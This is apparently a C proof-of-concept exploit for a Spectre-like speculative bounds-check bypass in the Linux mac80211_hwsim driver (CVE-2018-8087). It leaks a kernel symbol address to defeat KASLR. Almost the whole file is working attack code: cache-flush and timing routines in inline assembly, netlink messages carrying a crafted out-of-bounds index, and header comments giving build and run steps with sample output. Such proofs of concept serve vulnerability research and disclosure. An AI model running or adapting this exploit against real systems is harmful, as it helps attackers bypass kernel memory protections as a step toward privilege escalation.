// Goal of this attack :
// - Leak address of kernel symbol "hwsim_world_regdom_custom" via exploiting remaining spectre-like gadget.
// - If attacker can get the address, It can be exploited for bypassing security mechanism such as KASLR.
// 
// Assumption :
// - This is just PoC to show possibility which exploits remaining spectre-like gadget.
// - So This code requires several assumptions.
// --- No SMAP, No PTI (Page Table Isolation)
//
// Referenced CVE :
// - CVE-2018-8087
//
// Spectre-like gadget in mac80211_hwsim :
// - hwsim_new_radio_nl() in drivers/net/wireless/mac80211_hwsim.c
//   if (idx >= ARRAY_SIZE(hwsim_world_regdom_custom))  ==> Bypass this check via speculative execution
//      return -EINVAL;
//   param.regd = hwsim_world_regdom_custom[idx];  ==> Attacker can control dev_minor. Try to access from here to leak area.
//
// Usage :
// & sudo ./setup_mac_hwsim.sh
// $ gcc -I/usr/include/libnl3 -o leak_mac_hwsim leak_mac_hwsim.c -lnl-3 -lnl-genl-3
// & sudo cat /proc/kallsyms | grep hwsim_world_regdom_custom  ==> ffffffffc06f7100 r hwsim_world_regdom_custom    [mac80211_hwsim]
// $ sudo ./leak_mac_hwsim ffffffffc06f7100
//   mmap_addr : 10000
//   family_id : 27
//   time : 34
//   cache hit! ffffffffc06f7100 is address of hwsim_world_regdom_custom
//
// Contact :
// - Jinbum Park <jinb.park7@gmail.com>
//

#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <asm/unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netlink/msg.h>
#include <netlink/attr.h>

#define GENL_HWSIM_FAMILY_NAME "MAC80211_HWSIM"
#define GENL_HWSIM_ATTR_MSG_MAX 20
#define HWSIM_CMD_NEW_RADIO 4
#define HWSIM_CMD_DEL_RADIO 5
#define HWSIM_ATTR_CHANNELS 9
#define HWSIM_ATTR_REG_CUSTOM_REG 12
#define HWSIM_ATTR_RADIO_NAME 17

#define ARRAY_ELEM_SIZE (8)
#define MMAP_MIN_ADDR (0x10000UL)

void user_flush_cacheline(void *arg)
{
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
        "clflush %0"
	    : "+m" (*(volatile char *)arg)
	    : /* no inputs */
        : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg)
{
    int tsc1, tsc2, read_copy;
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %0\n\t"
        "mov (%3), %%eax\n\t"
        "mov %%eax, %2\n\t"
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %1\n\t"
        : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
        : "r"((unsigned int *)arg)
        : "ax", "bx", "cx", "dx");
    return tsc2 - tsc1;
}

static void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &set)) {
		printf("error\n");
		exit(-1);
	}
}

static int send_msg_to_kernel(struct nl_sock *sock, unsigned int index, int new)
{
	struct nl_msg* msg;
	int family_id, err = 0, id;
	unsigned int custom_reg = index;
	int cmd;

	family_id = genl_ctrl_resolve(sock, GENL_HWSIM_FAMILY_NAME);
	if(family_id < 0){
		fprintf(stderr, "Unable to resolve family name!\n");
		exit(EXIT_FAILURE);
	}

	msg = nlmsg_alloc();
	if (!msg) {
		fprintf(stderr, "failed to allocate netlink message\n");
		exit(EXIT_FAILURE);
	}

	if (new == 1)
		cmd = HWSIM_CMD_NEW_RADIO;
	else
		cmd = HWSIM_CMD_DEL_RADIO;

	if(!genlmsg_put(msg, NL_AUTO_PID, NL_AUTO_SEQ, family_id, 0, NLM_F_REQUEST, cmd, 1)) {
		fprintf(stderr, "failed to put nl hdr!\n");
		err = -ENOMEM;
		goto out;
	}

	err = nla_put_u32(msg, HWSIM_ATTR_REG_CUSTOM_REG, custom_reg);
	if (err) {
		fprintf(stderr, "failed to put nl string!\n");
		goto out;
	}

	err = nl_send_auto(sock, msg);
	if (err < 0) {
		fprintf(stderr, "failed to send nl message!\n");
	}

out:
	nlmsg_free(msg);
	return err;
}

static void alloc_nl_sock(struct nl_sock** sock)
{
	int family_id, grp_id;
	unsigned int bit = 0;
	
	*sock = nl_socket_alloc();
	if(!*sock) {
		fprintf(stderr, "Unable to alloc nl socket!\n");
		exit(EXIT_FAILURE);
	}

	nl_socket_disable_seq_check(*sock);
	nl_socket_disable_auto_ack(*sock);

	if (genl_connect(*sock)) {
		fprintf(stderr, "Unable to connect to genl!\n");
		exit(EXIT_FAILURE);
	}

	family_id = genl_ctrl_resolve(*sock, GENL_HWSIM_FAMILY_NAME);
	if(family_id < 0){
		fprintf(stderr, "Unable to resolve family name\n");
		exit(EXIT_FAILURE);
	}
	printf("family_id : %d\n", family_id);
}

int main(int argc, char** argv)
{
	int ret;
	unsigned long addr;
	struct nl_sock *nlsock = NULL;
	char *mmap_addr = NULL;
	unsigned long area, index, offset;
	int time;

	if (argc != 2) {
		printf("USAGE: ./poc <test address>\n");
		return 0;
	}
	area = strtoull(argv[1], NULL, 16);

	mmap_addr = mmap(MMAP_MIN_ADDR, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
	if (mmap_addr == MAP_FAILED) {
		printf("mmap error\n");
		return 0;
	}
	printf("mmap_addr : %lx\n", (unsigned long)mmap_addr);
	if (mlock(mmap_addr, 4096) != 0) {
		printf("mlock error\n");
		return 0;
	}

	// calculate index
	offset = mmap_addr - area;
	index = offset / ARRAY_ELEM_SIZE;

	pin_cpu(0);

	alloc_nl_sock(&nlsock);

	user_flush_cacheline(mmap_addr);
	send_msg_to_kernel(nlsock, index, 1);
	time = user_timed_reload(mmap_addr);
	printf("time : %d\n", time);
	if (time < 100) {
		printf("cache hit! %lx is address of hwsim_world_regdom_custom\n", area);
	}

	nl_socket_free(nlsock);
	munmap(mmap_addr, 4096);
	return 0;
}
